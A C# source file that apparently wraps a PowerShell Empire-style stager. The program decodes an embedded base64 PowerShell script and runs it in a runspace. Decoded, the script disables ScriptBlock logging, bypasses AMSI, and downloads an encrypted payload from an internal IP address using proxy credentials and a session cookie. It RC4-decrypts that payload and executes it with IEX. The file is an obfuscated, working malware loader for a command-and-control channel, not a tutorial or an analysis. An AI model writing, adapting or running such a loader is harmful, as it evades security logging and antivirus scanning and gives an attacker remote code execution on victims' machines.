/*
 * 
 * You may compile this in Visual Studio or SharpDevelop etc.
 * 
 * 
 * 
 * 
 */
using System;
using System.Text;
using System.Management.Automation; 
using System.Management.Automation.Runspaces; 

namespace cmd
{
	class Program
	{
		public static void Main(string[] args)
		{
			string stager = "SQBGACgAJABQAFMAVgBlAFIAUwBpAE8AbgBUAEEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUAZgBdAC4AQQBTAHMAZQBtAGIAbAB5AC4ARwBlAHQAVABZAFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAGUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAQQBMAFUARQAoACQATgBVAGwAbAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBmAEUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAEYARQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBMAEwAZQBDAHQASQBvAG4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAGkAYwB0AGkATwBuAGEAUgB5AFsAUwB0AFIAaQBuAEcALABTAFkAUwB0AEUATQAuAE8AQgBqAGUAQwBUAF0AXQA6ADoATgBFAFcAKAApADsAJAB2AGEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEAZgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAGwAfQBFAEwAUwBlAHsAWwBTAGMAcgBpAHAAdABCAEwAbwBjAEsAXQAuACIARwBlAFQARgBJAGUAYABsAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBMAFUAZQAoACQAbgBVAEwATAAsACgATgBFAHcALQBPAEIASgBFAGMAVAAgAEMATwBsAGwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAcgBJAEMALgBIAEEAcwBoAFMARQBUAFsAUwB0AFIASQBuAEcAXQApACkAfQAkAFIARQBmAD0AWwBSAGUARgBdAC4AQQBzAFMAZQBtAGIATABZAC4ARwBlAHQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAEYALgBHAEUAVABGAGkAZQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBMAFUARQAoACQATgB1AEwATAAsACQAVABSAHUARQApADsAfQA7AFsAUwB5AFMAdABFAG0ALgBOAEUAdAAuAFMAZQBSAHYAaQBDAGUAUABvAEkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AFAAZQBjAHQAMQAwADAAQwBPAE4AdABpAE4AVQBFAD0AMAA7ACQAZgA5ADQARQA9AE4ARQB3AC0ATwBiAEoAZQBDAFQAIABTAFkAUwBUAGUATQAuAE4ARQBUAC4AVwBlAEIAQwBMAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAE4AYwBPAEQAaQBuAEcAXQA6ADoAVQBOAEkAQwBvAEQAZQAuAEcARQB0AFMAVABSAEkATgBnACgAWwBDAG8ATgB2AEUAcgBUAF0AOgA6AEYAUgBPAG0AQgBhAFMAZQA2ADQAUwBUAHIASQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBADEAQQBEAEEAQQBMAGcAQQB4AEEARABVAEEATABnAEEAeQBBAEQAVQBBACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAEYAOQA0AGUALgBIAGUAQQBkAEUAUgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABmADkANABFAC4AUAByAG8AeABZAD0AWwBTAHkAUwB0AEUAbQAuAE4ARQBUAC4AVwBFAEIAUgBFAHEAdQBFAHMAVABdADoAOgBEAEUARgBhAHUATABUAFcAZQBiAFAAcgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAHgAeQAuAEMAcgBlAGQARQBOAHQAaQBBAGwAUwAgAD0AIABbAFMAeQBzAFQARQBNAC4ATgBFAFQALgBDAFIARQBEAEUAbgBUAEkAYQBMAEMAQQBDAEgARQBdADoAOgBEAGUARgBBAFUATABUAE4ARQB0AFcAbwBSAEsAQwBSAGUARABlAG4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAFQAZQBNAC4AVABlAFgAdAAuAEUAbgBDAG8AZABJAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAFkAdABlAFMAKAAnAHYAcgBOAH0ALwBIADEAYQAoAGgAVgBMACMALgA9AHUAMwA8AGsASQA2ADgAJgB+AF0AOgBwAFMAVwBYAF8ARgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEYAOQA0AGUALgBIAGUAQQBkAGUAUgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAE4AeQBIAGoAZQBKAEYARgBhAEEAPQBnADEAMwBjAEgAZQBXAGkAeAAvAEUASAB1AFIASgBlAHAAKwBxAGsALwBwAEIAWQB2AHcAWQA9ACIAKQA7ACQAZABBAHQAQQA9ACQAZgA5ADQAZQAuAEQAbwBXAG4ATABPAGEARABEAGEAdABhACgAJABTAEUAUgArACQAVAApADsAJABJAFYAPQAkAGQAYQBUAGEAWwAwAC4ALgAzAF0AOwAkAEQAQQBUAEEAPQAkAGQAQQBUAEEAWwA0AC4ALgAkAEQAYQB0AGEALgBsAEUATgBHAFQASABdADsALQBqAG8AaQBOAFsAQwBoAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==";
			var decodedScript = Encoding.Unicode.GetString(Convert.FromBase64String(stager));

            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            pipeline.Commands.AddScript(decodedScript);

            pipeline.Commands.Add("Out-Default");
            pipeline.Invoke();
        }
	}
}